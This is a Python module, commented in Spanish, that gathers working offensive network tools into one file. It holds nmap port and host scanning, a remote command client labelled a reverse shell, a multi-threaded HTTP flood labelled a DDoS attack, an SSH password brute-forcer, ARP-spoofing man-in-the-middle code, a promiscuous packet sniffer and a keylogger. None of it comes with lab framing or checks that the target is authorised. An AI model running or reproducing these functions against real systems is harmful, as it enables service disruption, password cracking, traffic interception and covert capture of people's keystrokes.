import nmap
import netifaces
import ipaddress
import logging
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import scapy.all as scapy
import paramiko
import os
from socket import socket, AF_INET, SOCK_STREAM, gethostbyname, gaierror
import keyboard

# Configuración básica de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constantes
MAX_THREADS = 10
DEFAULT_TIMEOUT = 5
SNIFFER_PACKET_LIMIT = 200

def validate_ip(ip):
    """Valida una dirección IP"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def get_network_range(interface=None):
    """Obtiene el rango de red automáticamente"""
    try:
        interfaces = netifaces.interfaces()
        target_interface = interface if interface else interfaces[1]
        
        if target_interface not in interfaces:
            logger.error(f"Interfaz {target_interface} no encontrada")
            return None
            
        addresses = netifaces.ifaddresses(target_interface)
        if netifaces.AF_INET not in addresses:
            logger.error("No hay configuración IPv4")
            return None
            
        ip_info = addresses[netifaces.AF_INET][0]
        network = ipaddress.IPv4Network(f"{ip_info['addr']}/{ip_info['netmask']}", strict=False)
        return str(network)
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return None

def scan_ports(target, ports="1-1024", scan_type="-sS"):
    """Escanea puertos con Nmap"""
    try:
        if not validate_ip(target):
            raise ValueError("IP inválida")
            
        nm = nmap.PortScanner()
        nm.scan(hosts=target, ports=ports, arguments=scan_type)
        return sorted(
            port for host in nm.all_hosts()
            for proto in nm[host].all_protocols()
            for port in nm[host][proto].keys()
            if nm[host][proto][port]['state'] == 'open'
        )
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return []

def scan_network(ip_range=None):
    """Escanea dispositivos en red"""
    try:
        ip_range = ip_range or get_network_range()
        if not ip_range:
            raise ValueError("Rango de red no disponible")
            
        nm = nmap.PortScanner()
        nm.scan(hosts=ip_range, arguments='-sn -PE -PA21,23,80,3389')
        return [{
            'ip': host,
            'mac': nm[host]['addresses'].get('mac', 'Desconocida'),
            'hostname': nm[host].hostnames()[0].get('name', 'Desconocido'),
            'status': 'Activo'
        } for host in nm.all_hosts()]
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return []

def reverse_shell(target_ip, port=4444):
    """Establece conexión inversa"""
    try:
        if not validate_ip(target_ip):
            raise ValueError("IP inválida")
            
        with socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(DEFAULT_TIMEOUT)
            s.connect((target_ip, port))
            
            while True:
                cmd = input("$ ")
                if cmd.lower() in ('exit', 'quit'):
                    s.sendall(cmd.encode())
                    break
                s.sendall(cmd.encode())
                print(s.recv(4096).decode())
                
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        raise

def ddos_attack(target, port=80, duration=30, threads=5):
    """Ataque DDoS multi-hilo"""
    try:
        target_ip = gethostbyname(target)
        end_time = time.time() + duration
        
        def attack():
            while time.time() < end_time:
                try:
                    with socket(AF_INET, SOCK_STREAM) as s:
                        s.settimeout(1)
                        s.connect((target_ip, port))
                        s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                except:
                    continue
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(attack)
                
        return f"Ataque DDoS completado contra {target_ip}:{port}"
                
    except gaierror:
        error = "No se pudo resolver el nombre de host"
        logger.error(error)
        return error
    except Exception as e:
        error = f"Error en DDoS: {str(e)}"
        logger.error(error)
        return error

def ssh_bruteforce(target, username, wordlist, max_threads=5):
    """Fuerza bruta SSH"""
    try:
        if not os.path.isfile(wordlist):
            raise FileNotFoundError("Diccionario no encontrado")
            
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        found = None
        lock = threading.Lock()
        
        def try_password(password):
            nonlocal found
            if found: return
                
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=DEFAULT_TIMEOUT)
                ssh.close()
                with lock:
                    found = password
            except Exception:
                pass
                
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(try_password, passwords)
            
        return found if found else "Contraseña no encontrada"
            
    except Exception as e:
        error = f"Error en fuerza bruta: {str(e)}"
        logger.error(error)
        return error

def mitm_attack(target_ip, gateway_ip, interface=None):
    """Ataque MITM con ARP spoofing"""
    try:
        target_mac = scapy.getmacbyip(target_ip)
        gateway_mac = scapy.getmacbyip(gateway_ip)
        stop_event = threading.Event()
        
        def restore_network():
            """Restaura tablas ARP"""
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5)
            
        def arp_spoof():
            """Envía paquetes ARP falsos"""
            try:
                while not stop_event.is_set():
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                    scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                    time.sleep(2)
            finally:
                restore_network()
                
        threading.Thread(target=arp_spoof, daemon=True).start()
        return stop_event
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return None

def packet_sniffer(interface=None, timeout=30, packet_filter="tcp or udp"):
    """Captura paquetes de red"""
    try:
        if os.geteuid() != 0:
            raise PermissionError("Se requieren privilegios de root para sniffing")
            
        packets = []
        
        def packet_callback(packet):
            """Callback que procesa cada paquete capturado"""
            packets.append(packet)
            if len(packets) >= SNIFFER_PACKET_LIMIT:
                raise KeyboardInterrupt("Límite de paquetes alcanzado")
        
        # Configuración importante para la captura
        scapy.conf.verb = 0  # Desactiva mensajes de scapy
        scapy.conf.sniff_promisc = 1  # Modo promiscuo
        
        # Captura los paquetes con parámetros mejorados
        scapy.sniff(
            iface=interface,
            timeout=timeout,
            filter=packet_filter,
            prn=packet_callback,
            store=0,  # No almacenar en memoria interna de scapy
            monitor=False,  # Modo monitor solo si es compatible
            count=0  # Captura continua hasta timeout
        )
        
        return packets if packets else None
        
    except PermissionError as e:
        logger.error(f"Error de permisos: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Error en sniffer: {str(e)}")
        return None

def keylogger(output_file="keylog.txt", stop_key='f12'):
    """Registra pulsaciones de teclado"""
    try:
        if os.path.exists(output_file):
            os.remove(output_file)
            
        def on_key_event(event):
            with open(output_file, 'a') as f:
                if event.event_type == 'down':
                    f.write(
                        ' ' if event.name == 'space' else
                        '\n' if event.name == 'enter' else
                        f'[{event.name.upper()}]' if len(event.name) > 1 else
                        event.name
                    )
                        
        keyboard.hook(on_key_event)
        keyboard.wait(stop_key)
        keyboard.unhook_all()
        
        with open(output_file, 'r') as f:
            return f.read()
            
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return None